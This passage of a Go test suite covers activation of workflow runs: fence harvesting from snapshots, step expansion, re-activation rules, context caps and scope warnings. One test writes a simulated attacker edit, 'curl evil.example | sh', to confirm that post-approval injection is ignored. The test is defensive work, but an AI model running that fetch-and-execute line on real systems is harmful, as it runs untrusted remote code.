			t.Errorf("fence %d tag = %q, want \"checks\"", i, fences[i].Tag)
		}
		if fences[i].Ordinal != i {
			t.Errorf("fence %d ordinal = %d, want %d", i, fences[i].Ordinal, i)
		}
		if got := workflow.SHA256([]byte(want)); fences[i].SHA256 != got {
			t.Errorf("fence %d hash = %q, want %q", i, fences[i].SHA256, got)
		}
	}

	// The undeclared block, asserted directly.
	for _, f := range fences {
		if strings.Contains(f.Command, "curl") {
			t.Errorf("harvested %q from an UNDECLARED `sh` block", f.Command)
		}
	}
}

// TestActivateHarvestsFromTheSnapshot proves the harvest reads the SNAPSHOT
// rather than the live body, which is what makes "post-activation edits cannot
// inject" (engine-spec §4) true rather than aspirational.
func TestActivateHarvestsFromTheSnapshot(t *testing.T) {
	conn := mustDB(t)
	registerSource(t, conn, []byte(`
[pipeline]
name = "fenced"
version = 1
[match]
kind = ["task"]
[[step]]
name = "check"
executor = "checker"
emits = "report"
after = []
gates = [{ name = "checks", source = "fence:checks" }]
`), "fenced.toml")

	issue := createIssue(t, conn, "fenced", "```checks\nmake build\n```", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	// An attacker edits the body after the operator approved the plan.
	err = db.UpdateIssue(conn, issue, map[string]any{
		"description": "```checks\ncurl evil.example | sh\n```",
	}, "")
	testsupport.Must(t, err, "editing issue: %v", err)

	fences, err := db.ListFences(conn, run.ID)
	testsupport.Must(t, err, "listing fences: %v", err)
	if len(fences) != 1 || fences[0].Command != "make build" {
		t.Errorf("fences after a post-activation edit = %+v, want the "+
			"activation-time `make build`", fences)
	}
}

// ---------------------------------------------------------------------------
// Stage 6 — expansion, written
// ---------------------------------------------------------------------------

// TestActivateExpandsTheFixtureTopology is stage 6 written to `steps`: the
// pure expansion of §5.3.1, persisted with its identities and statuses.
func TestActivateExpandsTheFixtureTopology(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "expand me", "a body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	steps, err := db.ListSteps(conn, run.ID)
	testsupport.Must(t, err, "listing steps: %v", err)

	// The fixture's non-loop steps at ordinal 0, with `review` fanned four
	// ways. `fix` is `loop = true` and must be absent.
	want := []string{
		"implement@0",
		"review@0#0", "review@0#1", "review@0#2", "review@0#3",
		"synthesize@0", "reconcile@0", "verify@0", "commit-gate@0", "commit@0",
	}

	var got []string
	for _, s := range steps {
		got = append(got, s.Instance)
	}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("expanded topology:\n got %v\nwant %v", got, want)
	}

	for _, s := range steps {
		if s.Status != workflow.StatusPending {
			t.Errorf("step %s status = %q, want %q", s.Instance, s.Status, workflow.StatusPending)
		}
		if s.Ordinal != 0 {
			t.Errorf("step %s ordinal = %d, want 0", s.Instance, s.Ordinal)
		}
	}

	// `fix` is the loop step: absent at ordinal 0 per §11.3 (3).
	for _, s := range steps {
		if s.StepName == "fix" {
			t.Errorf("loop step `fix` expanded at ordinal 0 as %s", s.Instance)
		}
	}

	// The human gate carries its kind, so phase 3's `claim` can refuse it.
	for _, s := range steps {
		if s.StepName == "commit-gate" && s.Kind != workflow.TypeHuman {
			t.Errorf("commit-gate kind = %q, want %q", s.Kind, workflow.TypeHuman)
		}
		if s.StepName == "reconcile" && s.Kind != workflow.ClassAction {
			t.Errorf("reconcile kind = %q, want %q", s.Kind, workflow.ClassAction)
		}
	}
}

// TestActivateTopologyIsReproducible is §8.3's topology golden in unit form:
// the same inputs, activated into a FRESH database, reproduce the step table
// byte for byte.
func TestActivateTopologyIsReproducible(t *testing.T) {
	render := func(t *testing.T) string {
		t.Helper()
		conn := mustDB(t)
		registerFixture(t, conn)
		issue := createIssue(t, conn, "reproducible", "a body", "task", []string{"x"})
		run := startRun(t, conn, issue)
		_, err := activate(conn, run.ID)
		testsupport.Must(t, err, "activate: %v", err)

		steps, err := db.ListSteps(conn, run.ID)
		testsupport.Must(t, err, "listing steps: %v", err)
		var b strings.Builder
		for _, s := range steps {
			fmt.Fprintf(&b, "%s\t%s\t%s\t%s\t%s\t%.2f\n",
				s.Instance, s.Kind, s.Status, s.Executor, s.Class, s.ExpectedCost)
		}
		return b.String()
	}

	want := render(t)
	if want == "" {
		t.Fatal("the fixture expanded to zero steps")
	}
	for i := 0; i < 5; i++ {
		if got := render(t); got != want {
			t.Fatalf("activation %d into a fresh database differs:\n got:\n%s\nwant:\n%s",
				i, got, want)
		}
	}
}

// TestActivateExpandsOnlyPhaseOne is stage 6's laziness: an issue whose
// depends_on predecessor is not yet done does NOT expand, and its
// expanded_at_ms stays NULL so a later re-activation can pick it up.
func TestActivateExpandsOnlyPhaseOne(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	first := createIssue(t, conn, "first", "body", "task", nil)
	second := createIssue(t, conn, "second", "body", "task", nil)

	// second depends_on first.
	_, err := conn.Exec(
		`INSERT INTO issue_relations (source_issue_id, target_issue_id, relation_type, created_at)
		 VALUES (?, ?, 'depends_on', '2026-08-02T00:00:00Z')`,
		second, first,
	)
	testsupport.Must(t, err, "seeding relation: %v", err)

	run := startRun(t, conn, first, second)
	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	if result.IssuesExpanded != 1 {
		t.Errorf("expanded %d issues, want 1 (only the phase-1 issue)", result.IssuesExpanded)
	}
	// BOTH are bound and snapshotted: binding is not lazy, expansion is.
	if result.IssuesBound != 2 {
		t.Errorf("bound %d issues, want 2 — binding and snapshotting are not lazy",
			result.IssuesBound)
	}

	firstRI := runIssueOf(t, conn, run.ID, first)
	secondRI := runIssueOf(t, conn, run.ID, second)

	if !firstRI.Expanded() {
		t.Error("the phase-1 issue was not expanded")
	}
	if secondRI.Expanded() {
		t.Error("a blocked issue was expanded; later phases expand when their " +
			"predecessors complete (§6.7)")
	}
	if secondRI.IssueSnapshot == "" {
		t.Error("a blocked issue was not snapshotted; only EXPANSION is lazy")
	}

	// No steps exist for the blocked issue.
	steps, err := db.ListSteps(conn, run.ID)
	testsupport.Must(t, err, "listing steps: %v", err)
	for _, s := range steps {
		if s.IssueID == second {
			t.Errorf("step %s exists for a blocked issue", s.Instance)
		}
	}
}

// ---------------------------------------------------------------------------
// Stage 7 — promotion and the flip
// ---------------------------------------------------------------------------

// TestActivatePromotesBacklogIssues is stage 7's per-issue half: `backlog ->
// todo` via the issue verbs' own column and activity trail (engine-spec §2).
func TestActivatePromotesBacklogIssues(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	backlog := createIssue(t, conn, "in backlog", "body", "task", nil)
	started := createIssue(t, conn, "already started", "body", "task", nil)
	err := db.UpdateIssue(conn, started, map[string]any{
		"status": string(model.StatusInProgress),
	}, "")
	testsupport.Must(t, err, "advancing issue: %v", err)

	run := startRun(t, conn, backlog, started)
	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	promoted, err := db.GetIssue(conn, backlog)
	testsupport.Must(t, err, "reading promoted issue: %v", err)
	if promoted.Status != model.StatusTodo {
		t.Errorf("backlog issue status = %q after activation, want %q",
			promoted.Status, model.StatusTodo)
	}

	// An issue an operator already advanced is NOT walked back.
	untouched, err := db.GetIssue(conn, started)
	testsupport.Must(t, err, "reading advanced issue: %v", err)
	if untouched.Status != model.StatusInProgress {
		t.Errorf("in-progress issue status = %q after activation, want %q — "+
			"promotion advances, it does not reset",
			untouched.Status, model.StatusInProgress)
	}

	// The promotion is in the activity trail, like any other status move.
	var n int
	err = conn.QueryRow(
		`SELECT COUNT(*) FROM activity_log
		  WHERE issue_id = ? AND field_changed = 'status' AND new_value = 'todo'`,
		backlog,
	).Scan(&n)
	testsupport.Must(t, err, "reading activity log: %v", err)
	if n != 1 {
		t.Errorf("activity_log has %d promotion rows, want 1", n)
	}
}

// ---------------------------------------------------------------------------
// §5.4 — re-activation, RA1 through RA5
// ---------------------------------------------------------------------------

// TestReactivationRA1ExpandsNewPhasesOnly: re-activating an `active` run lints
// again and expands ONLY issues with expanded_at_ms IS NULL whose predecessors
// are now satisfied.
func TestReactivationRA1ExpandsNewPhasesOnly(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	first := createIssue(t, conn, "first", "body", "task", nil)
	second := createIssue(t, conn, "second", "body", "task", nil)
	_, err := conn.Exec(
		`INSERT INTO issue_relations (source_issue_id, target_issue_id, relation_type, created_at)
		 VALUES (?, ?, 'depends_on', '2026-08-02T00:00:00Z')`,
		second, first,
	)
	testsupport.Must(t, err, "seeding relation: %v", err)

	run := startRun(t, conn, first, second)
	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "first activate: %v", err)
	stepsAfterFirst := countRows(t, conn, "steps")

	// The predecessor completes; the second phase is now expandable.
	err = db.UpdateIssue(conn, first, map[string]any{
		"status": string(model.StatusDone),
	}, "")
	testsupport.Must(t, err, "completing the predecessor: %v", err)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "re-activate: %v", err)

	if !result.Reactivation {
		t.Error("re-activating an active run did not report itself as a re-activation")
	}
	if result.IssuesExpanded != 1 {
		t.Errorf("re-activation expanded %d issues, want 1 (the newly-unblocked phase)",
			result.IssuesExpanded)
	}
	// The already-expanded issue is NOT expanded again: expansion is
	// idempotent and re-entrant, which is what expanded_at_ms records.
	if got := countRows(t, conn, "steps"); got != stepsAfterFirst*2 {
		t.Errorf("steps = %d after re-activation, want %d (the first phase's rows "+
			"untouched, the second phase's added)", got, stepsAfterFirst*2)
	}
	if !runIssueOf(t, conn, run.ID, second).Expanded() {
		t.Error("the newly-unblocked issue was not expanded at re-activation")
	}
}

// TestDryRunReportsPromotedIssueIDs is DKT-102: a dry run's activation gate
// must not be answered on an undercounted roster. RUN-8's shape — a
// dependency-gated issue that was ALREADY bound (from a first activation) but
// becomes newly EXPANDABLE only on this call — is invisible to `IssuesBound`
// (which counts freshly-bound issues only), so the operator needs the
// promoted ids named directly rather than inferred from a bind count.
func TestDryRunReportsPromotedIssueIDs(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	first := createIssue(t, conn, "first", "body", "task", nil)
	second := createIssue(t, conn, "second", "body", "task", nil)
	_, err := conn.Exec(
		`INSERT INTO issue_relations (source_issue_id, target_issue_id, relation_type, created_at)
		 VALUES (?, ?, 'depends_on', '2026-08-02T00:00:00Z')`,
		second, first,
	)
	testsupport.Must(t, err, "seeding relation: %v", err)

	run := startRun(t, conn, first, second)
	_, err = activate(conn, run.ID)
	testsupport.Must(t, err, "first activate: %v", err)

	err = db.UpdateIssue(conn, first, map[string]any{
		"status": string(model.StatusDone),
	}, "")
	testsupport.Must(t, err, "completing the predecessor: %v", err)

	// A dry run of the re-activation that would newly expand `second` — RUN-8's
	// exact shape: bound previously, expandable and promotable only now.
	result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, DryRun: true})
	testsupport.Must(t, err, "dry-run re-activation: %v", err)

	if result.IssuesBound != 0 {
		t.Errorf("IssuesBound = %d, want 0 — `second` was already bound at "+
			"the first activation", result.IssuesBound)
	}
	if len(result.PromotedIssues) != 1 || result.PromotedIssues[0] != model.FormatID(second) {
		t.Fatalf("PromotedIssues = %v, want [%s] — the roster `issues_bound` "+
			"alone would have hidden", result.PromotedIssues, model.FormatID(second))
	}

	// And it wrote nothing.
	issue, err := db.GetIssue(conn, second)
	testsupport.Must(t, err, "reading issue: %v", err)
	if issue.Status != model.StatusBacklog {
		t.Errorf("issue status = %q after a dry run, want %q (unchanged)",
			issue.Status, model.StatusBacklog)
	}
}

// TestReactivationRA2InheritsPins is the reproducibility guarantee: the pin set
// is INHERITED, never recomputed. If re-activation re-pinned, an in-flight run
// would silently adopt an edited workflow — precisely what engine-core §4
// forbids.
func TestReactivationRA2InheritsPins(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	pinPath := filepath.Join(t.TempDir(), "policy.toml")
	err := os.WriteFile(pinPath, []byte("original policy\n"), 0o644)
	testsupport.Must(t, err, "writing pin file: %v", err)

	issue := createIssue(t, conn, "pinned", "body", "task", nil)
	run := startRun(t, conn, issue)

	_, err = activate(conn, run.ID, pinPath)
	testsupport.Must(t, err, "first activate: %v", err)
	before, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins: %v", err)

	// The pinned file is edited on disk, and a NEW workflow version is
	// registered. Neither may reach this run.
	err = os.WriteFile(pinPath, []byte("EDITED policy\n"), 0o644)
	testsupport.Must(t, err, "editing pin file: %v", err)
	src, err := os.ReadFile(fixturePath)
	testsupport.Must(t, err, "reading fixture: %v", err)
	registerSource(t, conn,
		[]byte(strings.Replace(string(src), "version = 1", "version = 2", 1)),
		"fixture-v2.toml")

	_, err = activate(conn, run.ID, pinPath)
	testsupport.Must(t, err, "re-activate: %v", err)

	after, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins after re-activation: %v", err)

	if len(after) != len(before) {
		t.Fatalf("pin count changed at re-activation: %d -> %d\nbefore %+v\nafter %+v",
			len(before), len(after), before, after)
	}
	for i := range before {
		if after[i] != before[i] {
			t.Errorf("pin %d changed at re-activation:\n before %+v\n after  %+v",
				i, before[i], after[i])
		}
	}

	// Stated separately because it is the failure this rule exists to prevent:
	// the run must still be pinned to version 1, not to the version 2 that was
	// registered underneath it.
	for _, p := range after {
		if p.Kind == db.PinKindWorkflow && p.Ref != "standard-change@1" {
			t.Errorf("workflow pin = %q after a re-register, want standard-change@1", p.Ref)
		}
	}
}

// TestReactivationRA3BindsNewIssues: issues added to the run since activation
// are bound and snapshotted at re-activation, and pinned against the
// ALREADY-PINNED workflow version when one exists for that name.
func TestReactivationRA3BindsNewIssues(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	first := createIssue(t, conn, "first", "body", "task", nil)
	run := startRun(t, conn, first)
	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "first activate: %v", err)

	// A second issue joins the run after it was activated.
	second := createIssue(t, conn, "late arrival", "late body", "task", nil)
	err = db.AddRunIssue(conn, run.ID, second)
	testsupport.Must(t, err, "adding issue to an active run: %v", err)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "re-activate: %v", err)
	if result.IssuesBound != 1 {
		t.Errorf("re-activation bound %d issues, want 1 (the new arrival)",
			result.IssuesBound)
	}

	ri := runIssueOf(t, conn, run.ID, second)
	if ri.WorkflowID == nil {
		t.Error("the late-arriving issue was not bound at re-activation")
	}
	if ri.BodySnapshot != "late body" {
		t.Errorf("late arrival body_snapshot = %q, want %q", ri.BodySnapshot, "late body")
	}
	if !ri.Expanded() {
		t.Error("the late-arriving issue was not expanded")
	}

	// It pinned against the version already pinned, adding no second pin.
	pins, err := db.ListPins(conn, run.ID)
	testsupport.Must(t, err, "listing pins: %v", err)
	var workflowPins int
	for _, p := range pins {
		if p.Kind == db.PinKindWorkflow {
			workflowPins++
		}
	}
	if workflowPins != 1 {
		t.Errorf("run has %d workflow pins after a late arrival, want 1", workflowPins)
	}
}

// TestReactivationRA4DispatchSeam pins RA4's shape rather than its behavior,
// which is vacuous at this stage: dispatches are S6. The seam must exist as a
// CALL so S6 adds a query behind it rather than a call site in the transaction.
func TestReactivationRA4DispatchSeam(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "dispatchable", "body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	// Vacuously true today: no dispatch can be open, so re-activation is
	// permitted. When S6 lands, this test's premise changes and the seam's
	// implementation is the only thing that has to.
	tx, err := conn.Begin()
	testsupport.Must(t, err, "begin: %v", err)
	defer tx.Rollback()

	open, err := dispatchOpen(tx, run.ID)
	testsupport.Must(t, err, "dispatchOpen: %v", err)
	if open {
		t.Error("dispatchOpen reported an open dispatch at a stage with no dispatches")
	}
}

// TestReactivationRA5RefusesTerminalRuns: re-activating a `done` or
// `abandoned` run is CONFLICT (exit 4).
func TestReactivationRA5RefusesTerminalRuns(t *testing.T) {
	for _, status := range []model.RunStatus{model.RunDone, model.RunAbandoned} {
		t.Run(string(status), func(t *testing.T) {
			conn := mustDB(t)
			registerFixture(t, conn)
			issue := createIssue(t, conn, "terminal", "body", "task", nil)
			run := startRun(t, conn, issue)

			_, err := activate(conn, run.ID)
			testsupport.Must(t, err, "activate: %v", err)
			err = db.SetRunStatus(conn, run.ID, status, "finished", nowMS)
			testsupport.Must(t, err, "setting run %s: %v", status, err)
			_, err = activate(conn, run.ID)
			if err == nil {
				t.Fatalf("activate succeeded on a %s run", status)
			}
			if code, _ := CodeOf(err); code != CodeConflict {
				t.Errorf("error code = %q, want %q", code, CodeConflict)
			}
			if !strings.Contains(err.Error(), string(status)) {
				t.Errorf("error does not name the run's status: %s", err)
			}
			// DKT-85: the refusal names the run's recorded reason, so an
			// operator with a stale picture learns why the run ended from
			// this one message rather than going to read the row.
			if !strings.Contains(err.Error(), "finished") {
				t.Errorf("error does not carry the recorded reason: %s", err)
			}
		})
	}
}

// TestActivateRefusesWaitingHuman: a parked run is resumed by `run resume`,
// never as a side effect of `run activate` — which would otherwise treat the
// run as a FIRST activation (re-scanning config, bumping activated_at_ms)
// because only `active` runs count as re-activations (DKT-85's family).
func TestActivateRefusesWaitingHuman(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)
	issue := createIssue(t, conn, "parked", "body", "task", nil)
	run := startRun(t, conn, issue)

	_, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)
	err = db.SetRunStatus(conn, run.ID, model.RunWaitingHuman, "operator pause", nowMS)
	testsupport.Must(t, err, "parking the run: %v", err)

	_, err = activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded on a waiting-human run")
	}
	if code, _ := CodeOf(err); code != CodeConflict {
		t.Errorf("error code = %q, want %q", code, CodeConflict)
	}
	if !strings.Contains(err.Error(), "run resume") {
		t.Errorf("error does not name the verb that un-parks: %s", err)
	}
}

// ---------------------------------------------------------------------------
// §5.5 — the context-size check
// ---------------------------------------------------------------------------

// TestActivateRefusesOversizedContext is engine-core §8, verbatim: "Oversized
// context bundles (config caps) are an engine error AT EXPANSION TIME — the
// fix is a pipeline/contract change, visible before spend."
//
// This stage is the first reader of the v6 `context.error_bytes` key.
func TestActivateRefusesOversizedContext(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	err := db.SetConfig(conn, 0, db.KeyContextErrorBytes, "256")
	testsupport.Must(t, err, "setting the error cap: %v", err)

	issue := createIssue(t, conn, "huge", strings.Repeat("x", 4096), "task", nil)
	run := startRun(t, conn, issue)

	_, err = activate(conn, run.ID)
	if err == nil {
		t.Fatal("activate succeeded with a context over the error cap")
	}
	if code, _ := CodeOf(err); code != CodeValidation {
		t.Errorf("error code = %q, want %q", code, CodeValidation)
	}
	// The message names the cap and the offending step, so the fix is
	// actionable without a second command.
	for _, want := range []string{"context.error_bytes", "256", "implement@0"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error does not mention %q: %s", want, err)
		}
	}

	// "nothing written" — the refusal happens mid-expansion, so this is where
	// a non-fat transaction would leave a half-expanded run behind.
	assertNothingWritten(t, conn)
}

// TestActivateWarnsWithoutRefusing is the other half of the cap pair: the WARN
// threshold reports and proceeds. Only the ERROR cap refuses.
func TestActivateWarnsWithoutRefusing(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	err := db.SetConfig(conn, 0, db.KeyContextWarnBytes, "128")
	testsupport.Must(t, err, "setting the warn cap: %v", err)
	err = db.SetConfig(conn, 0, db.KeyContextErrorBytes, "1000000")
	testsupport.Must(t, err, "setting the error cap: %v", err)

	issue := createIssue(t, conn, "warn me", strings.Repeat("x", 4096), "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate refused on a WARN-level context: %v", err)
	if len(result.ContextWarnings) == 0 {
		t.Fatal("no context warnings for a closure over context.warn_bytes")
	}
	for _, w := range result.ContextWarnings {
		if w.Bytes <= w.Cap {
			t.Errorf("warning for %s reports %d bytes against a %d cap",
				w.Instance, w.Bytes, w.Cap)
		}
	}
	// And the run activated regardless: a warning is visible-before-spend, not
	// a refusal.
	if result.Run.Status != model.RunActive {
		t.Errorf("run status = %q, want %q — a warning does not refuse",
			result.Run.Status, model.RunActive)
	}
	if countRows(t, conn, "steps") == 0 {
		t.Error("no steps written despite the activation succeeding")
	}
}

// ---------------------------------------------------------------------------
// The unscoped-holder lint
// ---------------------------------------------------------------------------

// An issue that declares no scope is NEVER EXCLUDED — ready.go's scopeConflict
// returns on the first branch, "a scope-less issue is never excluded", and
// ClaimablePrefix takes the same exit. So an unscoped issue bound to a workflow
// that HOLDS THE TREE is mutually exclusive with nothing, and under
// stage-parallel spawning its writer runs beside every other step in the
// repository. RUN-5 bound exactly such an issue and printed nothing at all.
//
// The state is legal and occasionally intended, so activation reports rather
// than refuses. What these tests pin is that it is reported at all, that it
// discriminates on the two facts R4 actually reads — a scope that is NULL, and a
// step that holds the tree — and that `--dry-run` carries it, since the whole
// point of a dry run is to see what a real activation would bind.

// readOnlySource is a workflow no step of which holds the tree. It is the
// control for the lint's second fact: the issue below declares no scope either,
// and the ONLY difference is `holds_tree`.
const readOnlySource = `
[pipeline]
name = "reading-only"
version = 1
[match]
kind = ["task"]
[[step]]
name = "review"
executor = "worker"
emits = "notes"
holds_tree = false
after = []
`

// TestActivateWarnsOnUnscopedTreeHolder is the defect itself: bind a
// tree-holding workflow to an issue with NULL scope and the activation says so.
func TestActivateWarnsOnUnscopedTreeHolder(t *testing.T) {
	conn := mustDB(t)
	wf := registerFixture(t, conn)

	issue := createIssue(t, conn, "verify everything and commit", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate refused an unscoped issue: %v", err)

	if len(result.ScopeWarnings) != 1 {
		t.Fatalf("scope warnings = %d, want 1 — an unscoped issue bound to a "+
			"tree-holding workflow must be named", len(result.ScopeWarnings))
	}
	warning := result.ScopeWarnings[0]
	// NAMING THE ISSUE is the half that makes the warning actionable: an
	// operator with twenty issues in a run needs to know which one to fix.
	if warning.IssueID != model.FormatID(issue) {
		t.Errorf("warning names issue %q, want %q", warning.IssueID, model.FormatID(issue))
	}
	if warning.Workflow != wf.Ref() {
		t.Errorf("warning names workflow %q, want %q", warning.Workflow, wf.Ref())
	}
	if warning.Reason == "" {
		t.Error("warning carries no reason; a bare issue id does not tell an " +
			"operator what is wrong with it")
	}

	// A warning is not a refusal — the run activated and its steps exist.
	if result.Run.Status != model.RunActive {
		t.Errorf("run status = %q, want %q — the lint warns, it does not refuse",
			result.Run.Status, model.RunActive)
	}
	if countRows(t, conn, "steps") == 0 {
		t.Error("no steps written despite the activation succeeding")
	}
}

// TestActivateDoesNotWarnWhenScopeIsDeclared covers both declared forms, and the
// second case is the one worth writing down.
//
// NULL and `[]` are different facts (db.SetIssueScopeGlobs: "no scope declared"
// versus "declared to touch nothing"), and only NULL is the omission. An author
// who wrote an empty scope made a decision; warning about a deliberate decision
// is how a warning becomes noise, and a noisy warning costs the cases that are
// real.
func TestActivateDoesNotWarnWhenScopeIsDeclared(t *testing.T) {
	for _, tc := range []struct {
		name  string
		globs string
	}{
		{"a declared scope", `["internal/engine/**"]`},
		{"declared to touch nothing", `[]`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			conn := mustDB(t)
			registerFixture(t, conn)

			issue := createIssue(t, conn, "scoped", "a body", "task", nil)
			err := db.SetIssueScopeGlobs(conn, issue, tc.globs)
			testsupport.Must(t, err, "setting scope: %v", err)
			run := startRun(t, conn, issue)

			result, err := activate(conn, run.ID)
			testsupport.Must(t, err, "activate: %v", err)

			if len(result.ScopeWarnings) != 0 {
				t.Errorf("scope warnings = %+v, want none for scope %s",
					result.ScopeWarnings, tc.globs)
			}
		})
	}
}

// TestActivateDoesNotWarnWhenNothingHoldsTheTree is what keeps the lint keyed to
// the exclusion mechanism rather than to "has no scope".
//
// The issue here is just as unscoped as the one above. Its workflow declares
// `holds_tree = false` throughout, so its steps never participate in scope
// exclusion at all and there is nothing for a scope to have prevented.
func TestActivateDoesNotWarnWhenNothingHoldsTheTree(t *testing.T) {
	conn := mustDB(t)
	registerSource(t, conn, []byte(readOnlySource), "reading-only.toml")

	issue := createIssue(t, conn, "read the tree", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v", err)

	// The silence must come from `holds_tree`, not from an issue the lint never
	// saw: without this the test would pass just as well if binding had produced
	// nothing to lint.
	if result.IssuesBound != 1 {
		t.Fatalf("issues bound = %d, want 1", result.IssuesBound)
	}
	if len(result.ScopeWarnings) != 0 {
		t.Errorf("scope warnings = %+v, want none — no step of this workflow "+
			"holds the tree, so scope exclusion never consults it",
			result.ScopeWarnings)
	}
}

// TestActivateWarnsOnUnresolvableScope is the routing lint (DKT-33): an issue
// whose declared scope resolves NOTHING under the run's repository root is
// almost certainly planned into the wrong repository, and before this lint it
// failed only after a full wave — an executor booted into a worktree that
// cannot contain the fix, a gap filed, and the review fanout dispatched over
// the empty result.
func TestActivateWarnsOnUnresolvableScope(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	// A repository root holding `src/` and nothing else — the wrong-repo shape
	// for a scope that names `internal/engine/...`.
	repoRoot := t.TempDir()
	err := os.MkdirAll(filepath.Join(repoRoot, "src"), 0o755)
	testsupport.Must(t, err, "MkdirAll: %v", err)

	wrong := createIssue(t, conn, "planned into the wrong repository", "body", "task", nil)
	err = db.SetIssueScopeGlobs(conn, wrong,
		`["internal/engine/context.go","internal/engine/*_test.go"]`)
	testsupport.Must(t, err, "setting the unresolvable scope: %v", err)

	// A NEW-FILE scope: the file does not exist but its parent directory does,
	// so the entry anchors and the issue must not warn — flagging greenfield
	// work is how this warning would become noise.
	right := createIssue(t, conn, "greenfield work here", "body", "task", nil)
	err = db.SetIssueScopeGlobs(conn, right, `["src/newmodule.file"]`)
	testsupport.Must(t, err, "setting the anchored scope: %v", err)

	run := startRun(t, conn, wrong, right)
	execSQL(t, conn, `UPDATE runs SET exec_root = ? WHERE id = ?`, repoRoot, run.ID)

	result, err := activate(conn, run.ID)
	testsupport.Must(t, err, "activate: %v — the lint warns, it does not refuse", err)

	var hits []ScopeWarning
	for _, w := range result.ScopeWarnings {
		if strings.Contains(w.Reason, "resolves under") {
			hits = append(hits, w)
		}
	}
	if len(hits) != 1 {
		t.Fatalf("routing warnings = %+v, want exactly one for the wrong-repo issue", hits)
	}
	if hits[0].IssueID != model.FormatID(wrong) {
		t.Errorf("warning names %q, want %q", hits[0].IssueID, model.FormatID(wrong))
	}
	if !strings.Contains(hits[0].Reason, repoRoot) {
		t.Errorf("warning does not name the root it resolved against: %q", hits[0].Reason)
	}
}

// TestScopeWarningRidesOnDryRun is the placement that matters most. `--dry-run`
// exists so an operator sees what a run WOULD bind before committing to it, and
// a hazard visible only after the commit is one the dry run failed to report.
func TestScopeWarningRidesOnDryRun(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	issue := createIssue(t, conn, "verify everything and commit", "a body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, DryRun: true})
	testsupport.Must(t, err, "dry run: %v", err)

	if !result.DryRun {
		t.Fatal("result is not marked as a dry run")
	}
	if len(result.ScopeWarnings) != 1 {
		t.Fatalf("scope warnings = %d, want 1 on a dry run",
			len(result.ScopeWarnings))
	}
	if result.ScopeWarnings[0].IssueID != model.FormatID(issue) {
		t.Errorf("warning names issue %q, want %q",
			result.ScopeWarnings[0].IssueID, model.FormatID(issue))
	}

	// And the dry run still wrote nothing, so the warning cost no state.
	assertNothingWritten(t, conn)
}

// TestDryRunProjectsRatherThanRendersCommitted is DKT-96/DKT-100: a dry run's
// `Run` must render the STILL-COMMITTED state (`planning`, no
// `activated_at_ms`), never the rolled-back mutation, and the mutation itself
// must be readable from `ProjectedStatus`/`ProjectedActivatedAtMS` instead —
// so a caller can never mistake the JSON for a real activation's.
func TestDryRunProjectsRatherThanRendersCommitted(t *testing.T) {
	conn := mustDB(t)
	registerFixture(t, conn)

	issue := createIssue(t, conn, "first", "body", "task", nil)
	run := startRun(t, conn, issue)

	result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, DryRun: true})
	testsupport.Must(t, err, "dry run: %v", err)

	if !result.DryRun {
		t.Fatal("result is not marked as a dry run")
	}
	if result.Run.Status != model.RunPlanning {
		t.Errorf("dry-run Run.Status = %q, want %q (the committed state — "+
			"activation was never committed)", result.Run.Status, model.RunPlanning)
	}
	if result.Run.ActivatedAtMS != nil {
		t.Errorf("dry-run Run.ActivatedAtMS = %v, want nil (never committed)",
			*result.Run.ActivatedAtMS)
	}
	if result.ProjectedStatus != model.RunActive {
		t.Errorf("ProjectedStatus = %q, want %q", result.ProjectedStatus, model.RunActive)
	}
	if result.ProjectedActivatedAtMS == nil || *result.ProjectedActivatedAtMS != nowMS {
		t.Errorf("ProjectedActivatedAtMS = %v, want %d", result.ProjectedActivatedAtMS, nowMS)
	}

	// A `run status` read afterward must agree with the committed half —
	// proving the projection didn't leak into the database.
	committed, err := db.GetRun(conn, run.ID)
	testsupport.Must(t, err, "reading committed run: %v", err)
	if committed.Status != model.RunPlanning {
		t.Errorf("committed run status = %q, want %q — the dry run wrote something",
			committed.Status, model.RunPlanning)
	}
}

// TestDryRunReactivationProjectsNoChange is DKT-109: a dry run of a
